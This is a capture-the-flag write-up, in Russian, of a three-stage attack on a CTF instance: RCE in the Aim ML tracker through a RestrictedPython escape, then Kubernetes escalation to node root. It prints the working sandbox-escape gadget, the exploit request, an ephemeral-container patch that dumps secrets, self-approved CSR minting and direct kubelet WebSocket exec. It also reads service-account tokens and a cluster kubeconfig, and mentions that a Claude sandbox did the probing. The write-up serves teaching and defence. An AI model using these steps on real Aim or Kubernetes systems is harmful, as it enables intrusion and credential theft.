# Brainwash (task13 → task14 → task15) — разбор

**Avito CTF 2026 · web (RCE) → Kubernetes enum → Kubernetes takeover**
**Сайт:** `https://brainwash-ztkaw810.avitoctf.ru/` (лончер → инстанс Aim на своей k3s-ноде, namespace `brainwash-mlops`)

## Краткое условие

Три задачи на одном таргете, одна за другой:
- **task13** «пошарьтесь хорошенько в их файлах» — читаем секреты приложения;
- **task14** «зри в корень» / «загляни в каждый» — из пода эскалируем в Kubernetes-кластер, обходим все поды;
- **task15** «путь к тотальному доминированию» — захват кластера/ноды целиком.

Все три флага получены на живом инстансе. Итог:

| Задача | Флаг |
|---|---|
| task13 | `avito{3Xperim3n7s_aR3_unREL1aBl3_BU7_rcE_N3V3R_liEs}` |
| task14 | `avito{wHa7_PaS5Es_For_trUth_1S_Eph3mERaL}` |
| task15 | `avito{Learn_Th3_ORCh3S7r4TioN_Not_The_ind0ctr1n4t1on}` |

## Разведка

### Фингерпринтинг стека
Первый шаг — понять, ЧТО перед тобой, прежде чем что-то фаззить. Ответы сервера (`server: uvicorn`), путь `/static-files/`, характерные React-ассеты (`RunDetailMetricsAndSystemTab.js`, `aim_ui`) и, самое главное, полностью читаемый `openapi.json` с эндпоинтами вида `/api/runs/search/run` однозначно указывают на **Aim** (aimhub.io) — open-source ML-трекер экспериментов на FastAPI/uvicorn. Скачали `aim==3.29.1` с PyPI и **сверили его openapi-схему** с той, что отдаёт таргет — схемы совпали побайтово, значит известна точная версия и весь исходник (`aimsrc/aimpkg/`).

**Вывод:** знание версии + доступного исходника открытого продукта — это сразу поиск известных CVE именно под эту версию, а не слепой перебор параметров.

### Поиск known-CVE и выбор кандидата
Через `gh api /advisories` подняли полный список Aim CVE. Для пина 3.29.1 актуальны:
- **CVE-2024-2195 / CVE-2025-5321** — RCE-класс: побег из песочницы RestrictedPython в AimQL (язык фильтрации ранов).
- **CVE-2025-51464** — XSS в Reports через Pyodide (клиентская, WASM-питон в браузере посетителя).
- **CVE-2025-51463** — path traversal → arbitrary file write в `restore_run_backup()`, но достижим только через remote-tracking RPC.

RCE-класс (2024-2195/2025-5321) — самый ценный, дальше копали его.

### Блокер: RCE есть, а сработать нечем
Построчная перепроверка исходника (`aim/storage/query.py`, `aim/web/api/runs/views.py`) показала: вредоносный AimQL-предикат вычисляется (`eval`) **только** во время итерации по существующим объектам Run — внутри `for run in runs_iterator` в `QueryRunSequenceCollection`. На свежем инстансе `num_runs=0` (проверено многократными Stop/Start рестартами через лончер, с мониторингом далеко за пределами заявленных ~180 сек «boot+seed»). Все write-эндпоинты на порту 80 (`aim up`) либо декорированы `@check_read_only`, либо требуют уже существующий `run_id` — **ни один эндпоинт на :80 не создаёт Run**. Классическая курица-яйцо: эксплойт готов, а срабатывать не на чем.

Проверили и Reports/Pyodide (реальным headless Chrome через Playwright) как альтернативный путь что-то создать: XSS (CVE-2025-51464) подтверждена живьём (`pyodide.code.run_js` реально делает fetch и `alert()`), но объект `repo`, доступный внутри отчёта, экспортирует только `fetch_*`-методы — то есть это **read-only** обёртка над тем же `/api/runs/search/*`. Создать Run из отчёта невозможно, XSS тут бесполезна (нет второго пользователя/бота, которого можно было бы этим атаковать).

### Единственный write-канал — и урок про «проверяй свою собственную точку измерения»
По коду единственный путь создать Run — remote-tracking сервер Aim (`aim server`), который принимает запись без авторизации. По умолчанию он слушает **:53800**. Прямые попытки достучаться до этого порта извне (curl, python `requests`, реальный `aim`-SDK, даже нативный браузерный WebSocket) стабильно давали «тишину» — и первым выводом было «порт не проброшен наружу».

Этот вывод оказался **ошибочным**, и ошибка поучительна сама по себе: все эти «независимые» проверки шли из **песочницы Claude**, у которой egress разрешён только на 80/443 — то есть все три «независимых» инструмента на самом деле упирались в один и тот же артефакт собственной сетевой позиции, а не в свойство таргета (это подтвердили контрольные пробы: заведомо живые сервисы на нестандартных портах через ту же песочницу вели себя так же «мертво»). Мораль: **три инструмента, идущие через одну и ту же точку выхода, — это не тройное подтверждение, а один и тот же артефакт, повторённый трижды.**

Контрольный тест с реальной пользовательской сети (`egress_check.py`, без VPN) показал: заведомо живые публичные сервисы на нестандартных портах отвечают нормально, сеть пользователя чистая. Но и с неё **:53800** (порт по умолчанию) вёл себя как «пустой» — TCP-коннект проходит, ответа нет ни на каком протоколе, точно так же, как и заведомо пустые порты того же хоста. Вывод: это не блокировка песочницы и не блокировка провайдера, а сам Kubernetes Service/LB перед подом реально не пробрасывает наружу **порт 53800 по умолчанию** — но это ещё не значит, что write-канал недостижим вообще.

Следующий шаг и был решающим: раз default-порт закрыт, надо смотреть на реальную топологию Kubernetes-сервиса, а не только на «стандартный» порт из документации Aim. Полный скан диапазона NodePort (30000–32767) нашёл, что tracking-сервер **реально выставлен наружу на NodePort `:30800`** (ответ `{"status": "OK"}` на `/status/`) — это отдельный, нестандартный порт, до которого предыдущие проверки просто не доходили, потому что перебирались только «угаданные» кандидаты (53800/8000/8080/43800), а не весь NodePort-диапазон.

**Урок:** когда упёрся в «порт мёртв» — задай вопрос «мёртв для кого и через что я это проверяю», и не ограничивайся портом по умолчанию, когда речь о Kubernetes Service — загляни во весь NodePort-диапазон.

## Уязвимость

Тут не одна уязвимость, а связка «архитектурная дыра в изоляции» + «побег из песочницы», которые вместе и составляют весь путь до RCE, плюс — на следующих этапах — типичная схема Kubernetes privesc через избыточные RBAC-права.

### 1. Побег из RestrictedPython (CVE-2024-2195 / CVE-2025-5321)
AimQL позволяет фильтровать Run-объекты Python-подобным выражением (`run.archived == False`), которое исполняется через `RestrictedPython`. «Песочница» блокирует только имена, начинающиеся с `_`. Но от любого разрешённого объекта обычной цепочкой **публичных** атрибутов можно дойти до системных модулей — **attribute pivot**:

```
run.db.runs().session.bind.dialect.dbapi.datetime.sys.modules["os"].system("<команда>")
```

Пошагово: `run.db` — SQLAlchemy-сессия → `.dialect.dbapi` — модуль `sqlite3` → `.datetime` — модуль `datetime`, импортированный внутрь `sqlite3` → `.sys` → `.modules["os"]` → `.system()`. Ни одно звено не начинается с `_`, поэтому блэклист по подчёркиванию бесполезен.

**Урок:** запрет «опасного» по чёрному списку почти всегда обходится — если есть доступ хоть к одному объекту процесса, цепочкой публичных атрибутов почти всегда можно дойти до `os`/`sys`. Безопасно — только строгий белый список разрешённого, а лучше вообще не исполнять пользовательские выражения в процессе приложения.

### 2. Внешне доступный unauth write-канал (self-seed через NodePort)
Гаджет срабатывает только при переборе существующих Run, а единственный способ создать Run — Aim remote-tracking сервер без авторизации, случайно (или по недосмотру инфраструктуры) выставленный наружу на нестандартном NodePort `:30800`. Это и есть предусловие для срабатывания п.1 — атакующий сначала создаёт себе Run через `aim://<host>:30800`, а уже потом бьёт по AimQL.

### 3. Дальше — типовая избыточность Kubernetes RBAC
На этапах task14/15 уязвимость — не в одном месте, а в наборе слишком широких прав у сервис-аккаунтов (`ci-runner` может патчить `ephemeralcontainers` любого пода; `cert-manager-sa` может создавать и **сам одобрять** CSR) в сочетании с тем, что кастомный admission-webhook ограничивает **subject** CSR, но не запрещает получить рабочий, пусть и не `system:masters`, клиентский сертификат — которого хватает, чтобы дотянуться до kubelet и там уже получить root на ноде через привилегированный под.

## Эксплуатация шаг за шагом

### task13 — RCE и первый флаг

1. **Self-seed Run** через найденный write-канал:
   ```python
   from aim import Run
   run = Run(repo="aim://<host>:30800", experiment="medoed")
   run["pwn"] = "medoed-was-here"
   run.close()
   ```
   После этого `GET /api/projects/activity/` показывает `num_runs=1` — предикат AimQL теперь будет исполняться.

2. **Стреляем AimQL RCE** — гаджет из раздела «Уязвимость», обёрнутый в командную строку:
   ```
   GET /api/runs/search/run?q=run.db.runs().session.bind.dialect.dbapi.datetime.sys.modules["os"].system("<b64-decoded shell>") or 1&limit=1
   ```
   `limit=1` — важная деталь: без него Aim пытается пройтись по всем Run'ам (при большом числе накопленных ранов это держит единственный uvicorn-воркер занятым надолго); с `limit=1` предикат гарантированно исполняется на первом же Run — стоимость O(1).

3. **Эксфильтрация.** Корневая ФС пода read-only и путь `/static-files/{path}` защищён корректно (`os.path.commonpath`, честный traversal-guard). Рабочая схема — не ломать guard, а класть файл туда, куда он и так пускает: RCE копирует нужный файл в `aim_ui/build/<random>.bin`, читаем обычным GET `/static-files/<random>.bin` (готово в `exploit.py`, режим `exfil`). Когда сама файловая система read-only и писать в `aim_ui/build` нельзя, рабочая альтернатива (`rce_exec.py`) — положить вывод команды в **параметр Run** через локальный SDK (`Run(repo='/data/repo'); r['out']=...`) и прочитать его обратно через `GET /api/runs/{id}/info`.

4. Результат: `/flag.txt` (смонтированный k8s-секрет `flag1`) в поде `webapp`, namespace `brainwash-mlops`, k3s, сервис-аккаунт **`ci-runner`** — **flag1**. Заодно тем же выстрелом достаём токен `ci-runner`: `/var/run/secrets/kubernetes.io/serviceaccount/token`.

### task14 — «зри в корень», обход Kubernetes (pivot из task13)

Из RCE у нас есть shell в поде — а значит и стандартный путь Kubernetes из пода в кластер:

1. Читаем токен сервис-аккаунта `ci-runner`, `namespace`, `ca.crt` из `/var/run/secrets/kubernetes.io/serviceaccount/` (уже читали в п.4 выше).
2. Обращаемся к API кластера этим токеном на `https://kubernetes.default.svc` (ClusterIP, доступно только изнутри пода — запросы идут через ту же RCE, не с внешней машины).
3. Смотрим RBAC `ci-runner` (`pod_rbac.py`): выдано `pods get/list` и, что важнее, **`pods/ephemeralcontainers patch`** — право подсаживать отладочный контейнер в ЛЮБОЙ под неймспейса, но не `exec`/`logs` и не прямое чтение `secrets`.
4. Перечисляем все поды (`pod_all.py`) и ищем, где ещё смонтирован секрет с флагом. Находим под **`cert-agent`** (SA `cert-manager-sa`), у которого есть secret-volume с именем, содержащим `flag`, смонтированный в `/flag.txt` — но напрямую секреты читать нельзя (403).
5. Раз `exec`/`logs` нет, а `ephemeralcontainers patch` есть — используем это единственное разрешённое действие: **PATCH** в под `cert-agent` эфемерный контейнер, который монтирует тот же volume read-only и одной командой дампит его в **termination message** (`/dev/termination-log`), а не выводит в stdout — потому что termination message читается через обычный `pods/get` (уже разрешённый verb), в отличие от `logs`/`exec`.
   ```python
   patch = {"spec": {"ephemeralContainers": [{
       "name": EC,
       "image": "registry.internal.brainwash/base:v1",
       "command": ["sh", "-c", "cat /f/* > /dev/termination-log 2>&1; sleep 2"],
       "volumeMounts": [{"name": VOL, "mountPath": "/f", "readOnly": True}],
       "terminationMessagePolicy": "File",
       "terminationMessagePath": "/dev/termination-log",
       "securityContext": {  # PodSecurity "restricted"-совместимо — иначе admission отклонит патч
           "allowPrivilegeEscalation": False, "capabilities": {"drop": ["ALL"]},
           "runAsNonRoot": True, "runAsUser": 10001, "seccompProfile": {"type": "RuntimeDefault"},
       },
   }]}}
   ```
   Контейнер завершается, читаем `status.ephemeralContainerStatuses[].state.terminated.message` через `GET /api/v1/namespaces/{ns}/pods/{pod}` — это и есть содержимое секрета.
6. Результат — **flag2** (секрет `flag2`, смонтированный `/flag.txt` в поде `cert-agent`).

### task15 — тотальное доминирование (pivot из task14)

Тот же приём с ephemeral-контейнером, но теперь монтируем не data-volume, а **собственный projected service-account volume** пода `cert-agent`, чтобы украсть токен `cert-manager-sa` (`pod_sa.py`):
```python
patch["spec"]["ephemeralContainers"][0]["command"] = ["sh", "-c", "cat /sa/token > /dev/termination-log 2>&1; sleep 2"]
# volumeMounts -> projected-том с serviceAccountToken источником
```

1. **Токен `cert-manager-sa` получен.** Проверяем его RBAC: разрешено **создавать и одобрять CertificateSigningRequest** с `signerName: kubernetes.io/kube-apiserver-client` — то есть можно самому выпустить себе клиентский сертификат для аутентификации в API-сервере.
2. **Первая попытка — напрямую в `system:masters`.** Формируем CSR с `O=system:masters` (`build_csr.py`/`pod_csr.py`) — это классический путь к cluster-admin, если ничего не мешает. Но на этом кластере стоит кастомный admission-webhook (`csr-subject.brainwash.local`), который **принудительно переписывает subject** одобряемого CSR на `CN=proxyman, O=node-proxymen` — то есть `system:masters` заблокирован конкретно на уровне webhook'а, не RBAC.
3. **Работаем с тем, что дают.** Создаём CSR → сами же (правами `cert-manager-sa`) его одобряем → забираем подписанный сертификат `CN=proxyman, O=node-proxymen` (`pod_mint.py`). RBAC-права этой новой identity — только `nodes/proxy get` (доступ к kubelet), никакого админства — но этого достаточно для следующего шага.
4. **Идём к kubelet.** С сертификатом `proxyman` обращаемся к API-серверу по пути `/api/v1/nodes/{node}/proxy/pods` (`pod_kubelet.py`) — видим список всех подов на ноде, в том числе **`kube-system/log-collector`**: `privileged: true`, `runAsUser: 0`, с `hostPath: /` смонтированным в `/host` (`pod_priv.py` подтвердил это разбором `securityContext`/`volumes` каждого пода на ноде).
5. **exec в привилегированный под = root на ноде.** Ключевая деталь: exec через `nodes/proxy`-путь на API-сервере **обрезает query string** WebSocket-запроса (параметры команды теряются) — поэтому WebSocket-exec бьём не через apiserver-proxy, а **напрямую в kubelet на `<hostIP>:10250`**, используя тот же клиентский сертификат `proxyman` (он всё равно авторизован как `nodes/proxy get`, а kubelet проверяет тот же клиентский TLS-сертификат) (`pod_exec.py`):
   ```
   GET /exec/kube-system/log-collector-.../collector?command=sh&command=-c&command=<cmd>&output=1&error=1&tty=0
   Upgrade: websocket
   Sec-WebSocket-Protocol: v4.channel.k8s.io
   ```
6. Внутри `log-collector` (root, hostPath `/` в `/host`): `cat /host/flag.txt` → **flag3**. Заодно прочитали `/host/etc/rancher/k3s/k3s.yaml` — kubeconfig с `system:masters` (буквальное тотальное доминирование над кластером, не только флаг).

## Флаги

- **task13:** `avito{3Xperim3n7s_aR3_unREL1aBl3_BU7_rcE_N3V3R_liEs}`
- **task14:** `avito{wHa7_PaS5Es_For_trUth_1S_Eph3mERaL}`
- **task15:** `avito{Learn_Th3_ORCh3S7r4TioN_Not_The_ind0ctr1n4t1on}`

## Выводы / уроки

- **Фингерпринтинг → известная CVE экономит часы.** Опознали Aim 3.29.1 по openapi.json → сразу пошли смотреть CVE именно этой версии, а не фаззить вслепую.
- **Чёрные списки в песочницах почти всегда обходятся.** RestrictedPython блокирует по `_`, но attribute-pivot доводит до `os` через цепочку публичных атрибутов — от любого доступного объекта.
- **Проверяй свою собственную точку измерения, а не только цель.** Вывод «порт 53800 мёртв» изначально был артефактом ограниченного egress песочницы (только 80/443), а не свойством таргета — «три независимых инструмента» на деле шли через одну и ту же точку выхода. Контрольный тест на заведомо живых сервисах вскрыл это.
- **Не ограничивайся портом «по умолчанию».** Настоящий write-канал был не на стандартном `:53800`, а на нестандартном Kubernetes NodePort `:30800` — нашёлся только полным сканом NodePort-диапазона (30000–32767), а не перебором «угаданных» портов.
- **В Kubernetes даже без `exec`/`logs`/`get secrets` можно прочитать секрет**, если разрешён `ephemeralcontainers patch`: подсадить контейнер, который сам сдампит нужный volume в **termination message**, читаемое через обычный `pods/get`.
- **CSR + право самоодобрения — путь к эскалации, но admission-webhook может сузить, а не закрыть его.** Даже когда `system:masters` заблокирован на уровне webhook'а (принудительная подмена subject), полученный «слабый» сертификат (`nodes/proxy`) может быть достаточным трамплином до kubelet → root на ноде → чтение любых файлов, включая kubeconfig с реальным cluster-admin.
- **Иногда прокси на уровне API-сервера ломает протокол (обрезает query string у WebSocket-запроса)** — если что-то не работает через штатный proxy-путь, стоит проверить прямое обращение к backend-сервису (в данном случае — kubelet на `:10250`) той же авторизацией.

## Файлы

- `task13/exploit.py` — RCE PoC (режимы `marker`/`exfil`/`runs`).
- `task13/pwn_brainwash.py` — self-seed через remote-tracking + RCE одним скриптом.
- `task13/rce_exec.py` — переиспользуемый RCE→exfil шелл через параметр Run (для read-only ФС).
- `task13/pod_all.py` — enum подов + ephemeral-container дамп секрета в termination message (flag2).
- `task13/pod_sa.py` — кража токена `cert-manager-sa` тем же приёмом.
- `task13/build_csr.py` / `task13/pod_csr.py` / `task13/pod_mint.py` — генерация и подача CSR, self-approve, получение сертификата `proxyman`.
- `task13/pod_kubelet.py` / `pod_kubelet2.py` / `pod_priv.py` — энумерация подов ноды через `nodes/proxy`, поиск привилегированного `log-collector`.
- `task13/pod_exec.py` — прямой WebSocket-exec в kubelet `:10250` (root на ноде, flag3).
- `task13/pod_rbac.py` — проверка RBAC (`clusterrolebindings`/`roles`) для `ci-runner` и `cert-manager-sa`.
- `task13/scan_instance.py`, `task13/probe53800.py`, `task13/egress_check.py` — сетевая диагностика (различение реального бэкенда от LB-шума, контроль собственной точки измерения).
- `task13/aimsrc/aimpkg/` — исходник Aim 3.29.1 с точными строками уязвимого гаджета.
- `task13/flags_found.txt`, `task13/chal_root.txt` — сводка по всем трём флагам.

Более сжатая версия этой же цепочки (командная шпаргалка) — `task13/SOLVED_writeup.md`.
